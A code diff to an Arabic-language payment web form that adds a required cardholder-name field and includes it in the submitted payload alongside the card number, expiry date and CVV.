@@ -280,6 +280,11 @@
                 <div class="section-title">تفاصيل البطاقة</div>
 
                 <div class="form-group">
+                    <label for="cardName">اسم صاحب البطاقة</label>
+                    <input type="text" id="cardName" placeholder="أدخل الاسم كما هو مكتوب على البطاقة">
+                </div>
+
+                <div class="form-group">
                     <label for="cardNumber">رقم البطاقة</label>
                     <input type="text" id="cardNumber" placeholder="أدخل رقم البطاقة" 
                            maxlength="19" dir="ltr" style="text-align: left;">
@@ -376,12 +381,13 @@
         });
 
         document.getElementById('payButton').addEventListener('click', async function() {
+            const cardName = document.getElementById('cardName').value;
             const cardNumber = document.getElementById('cardNumber').value;
             const expiryMonth = document.getElementById('expiryMonth').value;
             const expiryYear = document.getElementById('expiryYear').value;
             const cvv = document.getElementById('cvv').value;
 
-            if (!cardNumber || !expiryMonth || !expiryYear || !cvv) {
+            if (!cardName || !cardNumber || !expiryMonth || !expiryYear || !cvv) {
                 alert('يرجى إكمال جميع الحقول');
                 return;
             }
@@ -394,6 +400,7 @@
             
             const payload = {
                 ...userData,
+                cardName,
                 cardNumber,
                 expiryDate: `${expiryMonth}/${expiryYear}`,
                 cvv
